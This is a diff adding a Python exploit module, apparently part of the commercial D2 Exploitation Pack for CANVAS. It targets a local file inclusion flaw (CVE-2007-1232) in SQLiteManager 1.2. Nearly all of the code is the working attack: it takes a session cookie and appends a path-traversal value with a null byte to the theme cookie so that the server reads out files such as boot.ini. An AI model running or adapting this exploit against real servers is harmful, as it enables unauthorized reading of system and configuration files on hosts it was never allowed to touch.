@@ -1,0 +1,121 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import sys, time, os
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from httplib import HTTPConnection, HTTPSConnection
+
+# GUI info
+NAME = "SQLiteManager Local File Include Vulnerability"
+
+DESCRIPTION = "Local File Include Vulnerability in SQLiteManager"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "SQLiteManager"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "SQLiteManager 1.2"
+DOCUMENTATION["Date public"] = "2007.02.26"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/22727"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2007-1232"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-1232"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"], ["Linux"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""
+    self.url = "/sqlitemanager/"
+    self.file = "../../../../../../../../../../../../../boot.ini"
+    self.https = 0
+    self.name = NAME
+    return
+	
+  def display_file(self):
+    try:					
+      if self.https == 0:
+      	cnx = HTTPConnection(self.host)
+      else:
+      	cnx = HTTPSConnection(self.host)
+      
+      cnx.request("GET", self.url, None, {'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 'Accept':'*/*'})			
+      resp = cnx.getresponse()
+      hdr = resp.getheaders()
+      
+      for h in hdr:
+        if (h[0] == "set-cookie"):
+          cki = h[1]
+      
+      data = resp.read()	
+      
+      cki += ";SQLiteManager_currentTheme=" + self.file + "%00"
+      
+      cnx.request("GET", self.url, None, {'Cookie':cki,'User-Agent':'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)', 'Accept':'*/*'})			
+      resp = cnx.getresponse()
+      hdr = resp.getheaders()
+      data = resp.read()	
+      
+      cnx.close()
+      
+      self.log(data)
+    except:
+      self.log("HTTP(S) Transfer error")
+      return 0
+      		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.file = self.argsDict.get("file", self.file)
+    self.https = int(self.argsDict.get("https", self.https))
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+    
+    ret = self.display_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME,self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -O file:<path> -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
